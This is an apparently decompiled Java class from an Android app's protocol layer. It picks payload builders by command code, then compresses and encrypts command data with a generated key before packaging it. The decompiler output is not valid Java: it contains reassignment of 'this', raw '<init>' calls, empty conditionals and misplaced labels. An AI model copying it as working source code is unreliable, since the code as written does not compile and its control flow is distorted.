package com.vvt.phoenix.prot.databuilder;

import com.vvt.io.d;
import com.vvt.phoenix.prot.command.b;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.security.GeneralSecurityException;
import javax.crypto.SecretKey;

public abstract class r
{
  private static final boolean b;
  private static final boolean c;
  private final String a;
  private com.vvt.phoenix.prot.command.c d;
  private b e;
  private boolean f;
  private String g;
  
  static
  {
    boolean bool1 = true;
    boolean bool2 = com.vvt.phoenix.a.a;
    if (bool2)
    {
      bool2 = bool1;
      b = bool2;
      bool2 = com.vvt.phoenix.a.e;
      if (!bool2) {
        break label34;
      }
    }
    for (;;)
    {
      c = bool1;
      return;
      bool2 = false;
      break;
      label34:
      bool1 = false;
    }
  }
  
  public r()
  {
    String str = a();
    this.a = str;
  }
  
  public static r a(int paramInt)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    for (;;)
    {
      return (r)localObject;
      localObject = new com/vvt/phoenix/prot/databuilder/af;
      ((af)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/w;
      ((w)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/ad;
      ((ad)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/ag;
      ((ag)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/ac;
      ((ac)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/x;
      ((x)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/y;
      ((y)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/ai;
      ((ai)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/al;
      ((al)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/ah;
      ((ah)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/ak;
      ((ak)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/aa;
      ((aa)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/z;
      ((z)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/ab;
      ((ab)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/aj;
      ((aj)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/ae;
      ((ae)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/am;
      ((am)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/an;
      ((an)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/j;
      ((j)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/k;
      ((k)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/e;
      ((e)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/f;
      ((f)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/i;
      ((i)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/p;
      ((p)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/m;
      ((m)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/l;
      ((l)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/g;
      ((g)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/q;
      ((q)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/h;
      ((h)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/n;
      ((n)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/databuilder/o;
      ((o)localObject).<init>();
    }
  }
  
  private OutputStream a(com.vvt.phoenix.prot.command.c paramc, OutputStream paramOutputStream)
  {
    int i = 0;
    localObject1 = null;
    Object localObject2 = paramOutputStream;
    try
    {
      localObject2 = (ByteArrayOutputStream)paramOutputStream;
      localObject3 = localObject2;
      localObject3 = ((ByteArrayOutputStream)localObject2).toByteArray();
      localObject3 = com.vvt.an.a.a((byte[])localObject3);
      localObject4 = localObject3;
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        Object localObject3;
        int j;
        int k;
        boolean bool = c;
        if (bool) {}
        paramc.f(0);
        Object localObject4 = null;
        continue;
        localObject1 = paramOutputStream;
      }
    }
    j = paramc.n();
    i = 1;
    if (j == i)
    {
      bool = b;
      if (bool) {}
      d.a(paramOutputStream);
      localObject1 = new java/io/ByteArrayOutputStream;
      ((ByteArrayOutputStream)localObject1).<init>();
      localObject3 = localObject1;
      localObject3 = (ByteArrayOutputStream)localObject1;
      k = localObject4.length;
      ((ByteArrayOutputStream)localObject3).write((byte[])localObject4, 0, k);
      return (OutputStream)localObject1;
    }
  }
  
  private OutputStream a(SecretKey paramSecretKey, com.vvt.phoenix.prot.command.c paramc, OutputStream paramOutputStream)
  {
    int i = 0;
    localObject1 = null;
    Object localObject2 = paramOutputStream;
    try
    {
      localObject2 = (ByteArrayOutputStream)paramOutputStream;
      localObject3 = localObject2;
      localObject3 = ((ByteArrayOutputStream)localObject2).toByteArray();
      localObject3 = com.vvt.l.a.a(paramSecretKey, (byte[])localObject3);
      localObject4 = localObject3;
    }
    catch (GeneralSecurityException localGeneralSecurityException)
    {
      for (;;)
      {
        Object localObject3;
        int j;
        int k;
        boolean bool = c;
        if (bool) {}
        paramc.e(0);
        Object localObject4 = null;
        continue;
        localObject1 = paramOutputStream;
      }
    }
    j = paramc.m();
    i = 1;
    if (j == i)
    {
      bool = b;
      if (bool) {}
      d.a(paramOutputStream);
      localObject1 = new java/io/ByteArrayOutputStream;
      ((ByteArrayOutputStream)localObject1).<init>();
      localObject3 = localObject1;
      localObject3 = (ByteArrayOutputStream)localObject1;
      k = localObject4.length;
      ((ByteArrayOutputStream)localObject3).write((byte[])localObject4, 0, k);
      return (OutputStream)localObject1;
    }
  }
  
  private void a(com.vvt.phoenix.prot.command.c paramc, String paramString)
  {
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject1 = ((StringBuilder)localObject1).append(paramString);
    String str = ".compressed";
    localObject1 = str;
    try
    {
      com.vvt.an.a.a(paramString, (String)localObject1);
      int i = paramc.n();
      int j = 1;
      if (i == j)
      {
        bool = b;
        if (bool) {}
        a((String)localObject1, paramString);
      }
      return;
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        boolean bool = c;
        if (bool) {}
        bool = false;
        Object localObject2 = null;
        paramc.f(0);
      }
    }
  }
  
  private void a(String paramString1, String paramString2)
  {
    File localFile1 = new java/io/File;
    localFile1.<init>(paramString2);
    localFile1.delete();
    localFile1 = new java/io/File;
    localFile1.<init>(paramString1);
    File localFile2 = new java/io/File;
    localFile2.<init>(paramString2);
    localFile1.renameTo(localFile2);
  }
  
  private void a(SecretKey paramSecretKey, com.vvt.phoenix.prot.command.c paramc, String paramString)
  {
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject1 = ((StringBuilder)localObject1).append(paramString);
    String str = ".encrypted";
    localObject1 = str;
    try
    {
      com.vvt.l.a.a(paramSecretKey, paramString, (String)localObject1);
      int i = paramc.m();
      int j = 1;
      if (i == j)
      {
        bool = b;
        if (bool) {}
        a((String)localObject1, paramString);
      }
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = c;
        if (bool) {}
        bool = false;
        Object localObject2 = null;
        paramc.e(0);
      }
    }
  }
  
  private void b(com.vvt.phoenix.prot.command.c paramc, b paramb, String paramString, int paramInt)
  {
    IllegalArgumentException localIllegalArgumentException;
    if (paramc == null)
    {
      i = c;
      if (i != 0) {}
      localIllegalArgumentException = new java/lang/IllegalArgumentException;
      localIllegalArgumentException.<init>("Metadata is null");
      throw localIllegalArgumentException;
    }
    if (paramb == null)
    {
      i = c;
      if (i != 0) {}
      localIllegalArgumentException = new java/lang/IllegalArgumentException;
      localIllegalArgumentException.<init>("Command data is null");
      throw localIllegalArgumentException;
    }
    int i = 1;
    if ((paramInt == i) && (paramString == null))
    {
      boolean bool = c;
      if (bool) {}
      localIllegalArgumentException = new java/lang/IllegalArgumentException;
      localIllegalArgumentException.<init>("Payload path is null");
      throw localIllegalArgumentException;
    }
  }
  
  public s a(com.vvt.phoenix.prot.command.c paramc, b paramb, String paramString, int paramInt)
  {
    SecretKey localSecretKey = null;
    int i = 1;
    boolean bool2 = b;
    if (bool2) {}
    bool2 = b;
    if (bool2) {}
    b(paramc, paramb, paramString, paramInt);
    bool2 = false;
    Object localObject1 = null;
    this.d = paramc;
    this.e = paramb;
    this.f = false;
    this.g = paramString;
    boolean bool3;
    if (paramInt == i)
    {
      this.f = i;
      localObject1 = new java/io/FileOutputStream;
      ((FileOutputStream)localObject1).<init>(paramString);
      bool3 = b;
      if (!bool3) {}
    }
    for (;;)
    {
      Object localObject2;
      try
      {
        bool3 = b;
        if (bool3) {}
        localObject2 = a((OutputStream)localObject1);
      }
      catch (Exception localException2)
      {
        int j;
        label185:
        int k;
        boolean bool5;
        label250:
        localObject2 = localObject1;
        localObject1 = localException2;
        bool1 = c;
        if (bool1) {}
        d.a((OutputStream)localObject2);
        localObject2 = new java/io/File;
        ((File)localObject2).<init>(paramString);
        bool6 = ((File)localObject2).delete();
        if (!bool6)
        {
          bool6 = c;
          if (!bool6) {}
        }
        throw ((Throwable)localObject1);
      }
      try
      {
        bool2 = b;
        if (bool2) {}
        localObject1 = b((OutputStream)localObject2);
        localObject2 = this.d;
        j = ((com.vvt.phoenix.prot.command.c)localObject2).n();
        if (j == i)
        {
          boolean bool4 = b;
          if (bool4) {}
          bool4 = this.f;
          if (!bool4) {
            break label418;
          }
          localObject2 = this.d;
          a((com.vvt.phoenix.prot.command.c)localObject2, paramString);
        }
        localSecretKey = com.vvt.l.e.a();
        localObject2 = this.d;
        k = ((com.vvt.phoenix.prot.command.c)localObject2).m();
        if (k != i) {
          break label573;
        }
        bool5 = b;
        if (bool5) {}
        bool5 = this.f;
        if (!bool5) {
          break label437;
        }
        localObject2 = this.d;
        a(localSecretKey, (com.vvt.phoenix.prot.command.c)localObject2, paramString);
        localObject2 = localObject1;
      }
      catch (Exception localException1)
      {
        continue;
        localObject2 = localException1;
      }
    }
    bool2 = this.f;
    if (bool2)
    {
      bool2 = this instanceof af;
      if (bool2)
      {
        this = (af)this;
        bool2 = f();
        if (bool2)
        {
          bool2 = b;
          if (bool2) {}
          localObject1 = g();
        }
      }
    }
    for (;;)
    {
      ((s)localObject1).a(localSecretKey);
      d.a((OutputStream)localObject2);
      bool5 = b;
      if (bool5) {}
      return (s)localObject1;
      int m = 2;
      if (paramInt != m) {
        break;
      }
      this.f = false;
      localObject1 = new java/io/ByteArrayOutputStream;
      ((ByteArrayOutputStream)localObject1).<init>();
      break;
      boolean bool1;
      boolean bool6;
      label418:
      localObject2 = this.d;
      localObject1 = a((com.vvt.phoenix.prot.command.c)localObject2, (OutputStream)localObject1);
      break label185;
      label437:
      localObject2 = this.d;
      localObject1 = a(localSecretKey, (com.vvt.phoenix.prot.command.c)localObject2, (OutputStream)localObject1);
      localObject2 = localObject1;
      break label250;
      bool2 = b;
      if (bool2) {}
      localObject1 = new com/vvt/phoenix/prot/databuilder/c;
      ((c)localObject1).<init>();
      ((c)localObject1).a(paramString);
      continue;
      bool2 = b;
      if (bool2) {}
      localObject1 = new com/vvt/phoenix/prot/databuilder/c;
      ((c)localObject1).<init>();
      ((c)localObject1).a(paramString);
      continue;
      bool2 = b;
      if (bool2) {}
      a locala = new com/vvt/phoenix/prot/databuilder/a;
      locala.<init>();
      localObject1 = localObject2;
      localObject1 = ((ByteArrayOutputStream)localObject2).toByteArray();
      locala.a((byte[])localObject1);
      localObject1 = locala;
    }
  }
  
  protected abstract OutputStream a(OutputStream paramOutputStream);
  
  protected abstract String a();
  
  protected com.vvt.phoenix.prot.command.c b()
  {
    return this.d;
  }
  
  protected abstract OutputStream b(OutputStream paramOutputStream);
  
  protected b c()
  {
    return this.e;
  }
  
  protected boolean d()
  {
    return this.f;
  }
  
  protected String e()
  {
    return this.g;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/databuilder/r.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */